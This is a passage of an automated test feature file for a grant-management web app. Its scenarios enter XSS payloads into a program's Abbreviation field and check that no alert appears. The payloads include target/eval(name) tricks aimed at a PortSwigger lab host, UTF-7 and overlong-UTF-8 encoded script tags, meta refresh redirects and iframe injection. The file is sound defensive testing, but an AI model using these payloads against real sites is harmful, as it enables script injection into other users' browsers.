      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301096 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                  | Field                |
      | <a target="alert(1)" href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//">XSS via target in a tag</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301101 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                                                                                | Field                |
      | <img src="validimage.png" width="10" height="10" usemap="#xss"><map name="xss"><area shape="rect" coords="0,0,82,126" target="alert(1)" href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"></map> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301103 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                                                                                     | Field                |
      | <form action="http://subdomain1.portswigger-labs.net/xss/xss.php" target="alert(1)"><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input type="submit" value="XSS via target in a form"></form> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301105 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                                                                                                            | Field                |
      | <form><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input type="submit" formaction="http://subdomain1.portswigger-labs.net/xss/xss.php" formtarget="alert(1)" value="XSS via formtarget in input type submit"></form> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301111 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                                                                                                            | Field                |
      | <form><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input type="submit" formaction="http://subdomain1.portswigger-labs.net/xss/xss.php" formtarget="alert(1)" value="XSS via formtarget in input type submit"></form> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301117 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                               | Field                |
      | <meta http-equiv="refresh" content="0; url=//portswigger-labs.net"> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301126 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                              | Field                |
      | <meta charset="UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4- | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301128 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                           | Field                |
      | <meta http-equiv="Content-Type" content="text/html; charset=UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4- | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301132 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value              | Field                |
      | {testData:script1} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301134 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                         | Field                |
      | +/v9+ADw-script+AD4-alert(1)+ADw-/script+AD4- | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301138 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                         | Field                |
      | +/v++ADw-script+AD4-alert(1)+ADw-/script+AD4- | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301139 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                         | Field                |
      | +/v/+ADw-script+AD4-alert(1)+ADw-/script+AD4- | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301143 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                           | Field                |
      | <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests"> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301145 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                  | Field                |
      | <iframe sandbox src="//portswigger-labs.net"></iframe> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301149 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                        | Field                |
      | <meta name="referrer" content="no-referrer"> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301151 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                | Field                |
      | %C0%BCscript>alert(1)</script>%E0%80%BCscript>alert(1)</script>%F0%80%80%BCscript>alert(1)</script>%F8%80%80%80%BCscript>alert(1)</script>%FC%80%80%80%80%BCscript>alert(1)</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301153 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
